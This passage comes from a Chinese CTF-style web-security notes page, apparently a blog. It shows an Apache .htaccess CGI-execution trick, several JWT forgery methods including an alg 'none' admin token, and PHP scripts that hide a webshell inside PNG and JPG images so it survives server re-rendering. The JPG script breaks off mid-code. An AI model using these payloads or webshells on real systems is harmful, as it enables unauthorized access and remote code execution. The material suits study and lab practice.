class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Options +ExecCGI<br>AddHandler cgi-script <span class="hljs-string">.abc</span><span class="hljs-comment">#è¿™é‡Œçš„.abcæ˜¯æ„é€ çš„ï¼Œè¡¨ç¤º.abcåç¼€çš„æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œcgiè„šæœ¬æ‰§è¡Œ</span><br><br>shell.abc<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-keyword">echo</span>&amp;&amp;<span class="hljs-keyword">cd</span> <span class="hljs-string">&quot;/var/www/html&quot;</span>;<span class="hljs-keyword">ls</span> -al;<span class="hljs-keyword">echo</span> [S];<span class="hljs-keyword">pwd</span>;<span class="hljs-keyword">echo</span> [E]<br></code></pre></td></tr></table></figure><p>æ³¨è§£ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Options</span>æŒ‡ä»¤æ˜¯Apacheé…ç½®æ–‡ä»¶ä¸­ä¸€ä¸ªæ¯”è¾ƒå¸¸è§ä¹Ÿæ¯”è¾ƒé‡è¦çš„æŒ‡ä»¤ï¼Œ<span class="hljs-keyword">Options</span>æŒ‡ä»¤å¯ä»¥åœ¨ApacheæœåŠ¡å™¨æ ¸å¿ƒé…ç½®(<span class="hljs-keyword">server</span> config)ã€è™šæ‹Ÿä¸»æœºé…ç½®(virtual host)ã€ç‰¹å®šç›®å½•é…ç½®(directory)ä»¥åŠ.htaccessæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚<span class="hljs-keyword">Options</span>æŒ‡ä»¤çš„ä¸»è¦ä½œç”¨æ˜¯æ§åˆ¶ç‰¹å®šç›®å½•å°†å¯ç”¨å“ªäº›æœåŠ¡å™¨ç‰¹æ€§ã€‚<br>å…³äº<span class="hljs-keyword">Options</span>æŒ‡ä»¤åå¯ä»¥é™„åŠ çš„ç‰¹æ€§é€‰é¡¹çš„å…·ä½“ä½œç”¨åŠå«ä¹‰ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼šhttp://www<span class="hljs-number">.365</span>mini.com/page/apache-<span class="hljs-keyword">options</span>-directive.htm<br>å½“ç„¶æˆ‘ä»¬ç”¨åˆ°çš„å°±æ˜¯ExecCGIé€‰é¡¹ï¼Œè¡¨ç¤ºå…è®¸ä½¿ç”¨mod_cgiæ¨¡å—æ‰§è¡ŒCGIè„šæœ¬<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨èšå‰‘çš„æ’ä»¶å³å¯</p><h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><h3 id="æ— ç­¾å"><a href="#æ— ç­¾å" class="headerlink" title="æ— ç­¾å"></a>æ— ç­¾å</h3><p>ä¸€äº›JWTåº“ä¹Ÿæ”¯æŒnoneç®—æ³•ï¼Œå³ä¸ä½¿ç”¨ç­¾åç®—æ³•ã€‚å½“algå­—æ®µä¸ºç©ºæ—¶ï¼Œåç«¯å°†ä¸æ‰§è¡Œç­¾åéªŒè¯ã€‚å°è¯•æ‰¾åˆ° flagã€‚</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819003224592.png"></p><p>æŠ“åŒ…å¾—åˆ°ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">token</span>=eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span>NiJ<span class="hljs-number">9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>IjEyMyIsInBhc<span class="hljs-number">3</span>N<span class="hljs-number">3</span>b<span class="hljs-number">3</span>JkIjoiMTIzIiwicm<span class="hljs-number">9</span>sZSI<span class="hljs-number">6</span>Imd<span class="hljs-number">1</span>ZXN<span class="hljs-number">0</span>In<span class="hljs-number">0</span>.<span class="hljs-number">1</span>HzZE_bkrgzE<span class="hljs-number">12</span>m<span class="hljs-number">27</span>Odw_bKZvGA<span class="hljs-number">4</span>ytwP<span class="hljs-number">3</span>mLXvYIsQrk<br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ†æ®µbase64ä¹Ÿå¯ä»¥ä½¿ç”¨<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819003915180.png"></p><p>æœ€åé¢çš„<strong>VERIFY SIGNATURE</strong>ä¿®æ”¹æ— æ³•è§£å‡ºæ¥ï¼Œå› ä¸ºè®¾ç½®äº†ç­¾è¯ä¸ºç©ºï¼Œåˆ é™¤å³å¯ï¼Œç›´æ¥å°†ç¬¬äºŒä¸ªç‚¹å‰çš„æ•°æ®è¿›è¡Œè§£ç </p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819004041753.png"></p><p>ç»éªŒï¼Œç»™è¡¥ä¸Šä¸€ä¸ª<code>=</code></p><p>å°†<code>alg</code>è®¾ç½®ä¸º<code>none</code>ï¼Œå°†<code>role</code>è®¾ç½®ä¸º<code>admin</code></p><p>å¾—åˆ°payloadï¼š</p><blockquote><p>token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6IjEyMyIsInBhc3N3b3JkIjoiMTIzIiwicm9sZSI6ImFkbWluIn0.</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011534028.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011621792.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819011635058.png"></p><h3 id="å¼±å¯†é’¥"><a href="#å¼±å¯†é’¥" class="headerlink" title="å¼±å¯†é’¥"></a>å¼±å¯†é’¥</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819012520913.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819013136910.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819013309069.png"></p><h3 id="éå¯¹ç§°RS256ç§é’¥ç”Ÿæˆjwt"><a href="#éå¯¹ç§°RS256ç§é’¥ç”Ÿæˆjwt" class="headerlink" title="éå¯¹ç§°RS256ç§é’¥ç”Ÿæˆjwt"></a>éå¯¹ç§°RS256ç§é’¥ç”Ÿæˆjwt</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> privateKey = fs.readFileSync(process.cwd() + <span class="hljs-string">&#x27;//public//private.key&#x27;</span>)<br>  <span class="hljs-keyword">var</span> token = jwt.sign(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;)<br>  res.cookie(<span class="hljs-string">&#x27;auth&#x27;</span>, token)<br>  res.end(<span class="hljs-string">&#x27;where is flag?&#x27;</span>)<br>&#125;)<br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> auth = req.cookies.auth<br>  <span class="hljs-keyword">var</span> cert = fs.readFileSync(process.cwd() + <span class="hljs-string">&#x27;//public/public.key&#x27;</span>) <span class="hljs-comment">// get public key</span><br>  jwt.verify(auth, cert, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, decoded</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (decoded.user === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      res.end(flag)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      res.end(<span class="hljs-string">&#x27;you are not admin&#x27;</span>)<br>    &#125;<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure><p>å‘ç°å…¬é’¥ç§é’¥éƒ½åœ¨publicæ–‡ä»¶å¤¹ä¸‹ï¼Œä¸‹è½½ç§é’¥ï¼Œåˆ©ç”¨ç§é’¥ç”Ÿæˆjwt</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">var</span> privatekey = fs.readFileSync(<span class="hljs-string">&#x27;private.key&#x27;</span>)<br><span class="hljs-keyword">var</span> token = jwt.sign(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privatekey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;)<br><span class="hljs-built_in">console</span>.log(token)<br></code></pre></td></tr></table></figure><p>è¦†ç›–Cookie[auth]å³å¯</p><h3 id="å¯¹ç§°HS256å…¬é’¥ç”Ÿæˆjwt"><a href="#å¯¹ç§°HS256å…¬é’¥ç”Ÿæˆjwt" class="headerlink" title="å¯¹ç§°HS256å…¬é’¥ç”Ÿæˆjwt"></a>å¯¹ç§°HS256å…¬é’¥ç”Ÿæˆjwt</h3><p>ä¸‹è½½å…¬é’¥ï¼Œæ›´æ”¹éå¯¹ç§°ç®—æ³•RS256ä¸ºHS256</p><p>åˆ©ç”¨ä¸Šé¢è„šæœ¬ç”Ÿæˆjwtï¼Œè¦†ç›–å³å¯</p><h2 id="æ–‡ä»¶ä¸Šä¼ ä¹‹äºŒæ¬¡æ¸²æŸ“"><a href="#æ–‡ä»¶ä¸Šä¼ ä¹‹äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ä¹‹äºŒæ¬¡æ¸²æŸ“"></a>æ–‡ä»¶ä¸Šä¼ ä¹‹äºŒæ¬¡æ¸²æŸ“</h2><ul><li>PNG</li></ul><p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæ‰“å¼€æ–‡ä»¶é¢„è§ˆåä¸‹è½½ï¼Œå‘ç°ä¸€å¥è¯å·²ç»ä¸åœ¨ï¼Œå¯¹æ­¤æ–‡ä»¶<strong>å†™å…¥IDATæ•°æ®å—</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;1.png&#x27;</span>);  <span class="hljs-comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span><br><span class="hljs-comment">/* æœ¨é©¬å†…å®¹</span><br><span class="hljs-comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">GET:0=system</span><br><span class="hljs-comment">POST:1=ls</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åä¸Šä¼ ï¼Œä¼ å‚åä¸‹è½½æ–°åŠ è½½çš„å›¾ç‰‡ï¼ŒæŸ¥çœ‹å›¾ç‰‡çš„ä»£ç å³å¯</p><p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p><ul><li>JPG</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br>                <span class="hljs-variable">$outStreamTmp</span> =<br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) .<br>                    <span class="hljs-variable">$miniPayload</span> .<br>                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) .<br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> =<br>                        substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) .<br>                        <span class="hljs-variable">$miniPayload</span> .<br>                        substr(<br>                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) .<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            unlink(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = 